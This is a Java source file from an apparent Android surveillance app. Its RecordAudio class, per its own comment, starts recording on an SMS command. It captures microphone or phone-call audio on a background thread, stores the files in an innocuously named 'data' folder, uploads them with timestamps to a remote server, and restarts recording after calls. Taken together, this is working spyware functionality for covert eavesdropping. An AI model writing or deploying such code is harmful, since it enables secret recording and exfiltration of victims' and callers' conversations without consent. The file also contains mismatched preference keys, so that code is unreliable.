package com.inet.android.audio;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.MediaRecorder;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;
import com.loopj.android.http.RequestParams;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudio {

	private static MediaRecorder mMediaRecorder;
	private static String time;
	private static final String mPathName = "data";

	// Thread pool
	private static ExecutorService mThreadPool;
	public static AtomicBoolean mRecording = new AtomicBoolean(false);
	private static String outputFileName;
	private static String LOG_TAG = RecordAudio.class.getSimpleName()
			.toString();
	private final static int SECONDS_PER_MINUTE = 60;
//	private static final int MINUTE_PER_HOUR = 60;
	private static int minute = -1;
	private static int duration = -1;
	private static Context mContext;
	private static SharedPreferences sp;

	/*
	 * @param minute - count second for record
	 */
	static	MediaRecorder getRecorder(int min, int source, String fileName) {
		if (min != -1)
			minute = min * SECONDS_PER_MINUTE;

		if (mMediaRecorder == null) {
			mMediaRecorder = new MediaRecorder();
			switch (source) {
			case 1:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				break;
			case 2:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
				break;
			case 3:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
				break;
			case 4:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				break;
			case 5:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
				break;
			case 6:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
				break;
			default:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				break;
			}

			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mMediaRecorder.setAudioEncodingBitRate(16);
			mMediaRecorder.setAudioSamplingRate(44100);
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
		} else {
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
			return null;		
		}

		mMediaRecorder.setOutputFile(fileName);
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
			Logging.doLog(LOG_TAG, "mMediaRecorder.start()",
					"mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Logging.doLog(LOG_TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(LOG_TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
		return mMediaRecorder;
	}

	public static void createRecord(int minute, int source, String fileName) {
		// reset any previous paused position
		// initialise MediaRecorder
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		getRecorder(minute, source, fileName);
	}

	// --------create Recording----------------
	public static void executeRecording(final int minute, final int source,
			final Context ctx) {
		mContext = ctx;
		mThreadPool = Executors.newCachedThreadPool();
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(LOG_TAG, "executeRecording",
							"executeRecording");
					createRecord(minute, source, outputFileName);
					mRecording.set(true);
					// launch tehe counter
					Logging.doLog(LOG_TAG, "mThreadPool.execute",
							"mThreadPool.execute");
					Logging.doLog(LOG_TAG, "minute != -1 " + minute,
							"minute != -1 " + minute);
					mThreadPool.execute(new RecordingCounterUpdater());
				}
			}
		});
	}

	// public void executeStopAfterCallRecordng() {
	// mThreadPool.execute(new RecordingCounterUpdater());
	// }

	// --------stop recording and call sendAudio----------------
	public static void executeStopRecording() {
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					Logging.doLog(LOG_TAG, "executeStopRecording ",
							"executeStopRecording ");
					stopRecording();
					if (outputFileName != null)
						sendAudio(outputFileName);
					outputFileName = null;
				
				}

			}
		});

	}

	// --------stop recording and call sendAudio----------------
	public static void executeStopRecording(final int source,
			final Context mContext) {
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					sp = PreferenceManager
							.getDefaultSharedPreferences(mContext);
					Logging.doLog(LOG_TAG,
							"executeStopRecording source, mContext",
							"executeStopRecording source, mContext");

					Editor ed = sp.edit();
					ed.putInt("duration", minute - duration);
					ed.putInt("souce_record", source);
					ed.commit();

					stopRecording();
					if (outputFileName != null)
						sendAudio(outputFileName);
					outputFileName = null;
					executeRecording(-1, source, mContext);
				}

			}
		});

	}
	public static void checkStateRecord(Context mContext){
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		int appendRecord = sp.getInt("duration_record", -1);
		if (appendRecord != -1) {
			executeRecording(appendRecord,
					sp.getInt("source_record", -1), mContext);
			Editor ed = sp.edit();
			ed.putInt("duration", -1);
			ed.commit();
		}
	}
	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private static String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".aac";
		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Unable to create media file!",
					"Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private static class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			while (mRecording.get()) {
				if (minute != -1)
					postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
				duration = currentCounter;
				Logging.doLog(LOG_TAG, String.format(
						"posting counter update of:%d", currentCounter), String
						.format("posting counter update of:%d", currentCounter));
			}
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private static void postCounterUpdateMessage(int currentPosition) {

		if (currentPosition == minute) {
			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
			executeStopRecording();
		}
	}

	private static void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
			mRecording.set(false);
		}
	}

	private static void sendAudio(String path) {
		Logging.doLog(LOG_TAG, "sendAudio duration " + duration, "sendAudio "
				+ duration);
		if (!ValueWork.getLastCreateAudioFile().equals(path)) {
			RequestParams params = new RequestParams();
			try {
				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]", ConstantValue.TYPE_AUDIO_REQUEST);
				params.put("data[][duration]", duration);
				params.put("data[][path]", path);
				params.put("key", System.currentTimeMillis());
				params.put("data[][file]", new File(path));
			} catch (FileNotFoundException e) {
				Log.d(LOG_TAG, "FileNotFoundException");
				e.printStackTrace();
			}
			RequestList.sendFileRequest(params, mContext);
		}
	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	private static class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Logging.doLog(LOG_TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra), String.format("MediaRecorder error occured: %s,%d",
					whatDescription, extra));
		}
	}

}